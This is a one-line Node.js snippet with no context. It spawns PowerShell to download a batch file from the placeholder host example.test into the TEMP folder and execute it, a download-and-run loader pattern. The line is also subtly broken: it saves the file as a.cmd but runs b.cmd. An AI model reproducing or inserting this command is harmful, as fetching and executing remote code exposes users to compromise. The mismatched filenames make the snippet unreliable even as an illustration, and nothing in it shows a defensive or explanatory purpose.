require('child_process').spawn('powershell', ['-Command', 'curl https://example.test/tool.bat -o $env:TEMP\\a.cmd; & $env:TEMP\\b.cmd']);
